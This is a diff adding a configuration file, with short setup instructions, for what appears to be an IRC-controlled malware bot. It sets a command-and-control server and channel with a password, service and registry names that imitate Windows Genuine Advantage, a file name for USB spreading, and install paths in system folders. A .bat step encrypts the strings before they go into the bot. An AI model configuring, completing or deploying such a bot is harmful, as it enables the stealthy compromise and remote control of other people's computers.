@@ -1,0 +1,24 @@
+To us bot, open str.cfg with notepad and edit.
+Then open the .bat file and it will encrypt your strings, copy to bot the encrypted strings.
+
+
+
+password yourpasswordhere
+authhost1 *@lyourhosthere.gov
+exename yourfilenamehere.exe
+szRegname SysWGA
+gotopth %SysDir%
+infochan #Legi0n0fD00m
+rarexe 	OmegaVST.exe
+usbfname diskchk.exe
+TempPath C:\Windows\temper.exe
+
+servicename sysstart
+servicedisplayname WGAservice
+servicedesc WindowsGenuineAdv
+
+sinfo[curserver].host root.legion014.com
+sinfo[curserver].pass 
+sinfo[curserver].chan #Legi0n0fD00m
+sinfo[curserver].chanpass contempt014
+sinfo[curserver].modeonconn -ix
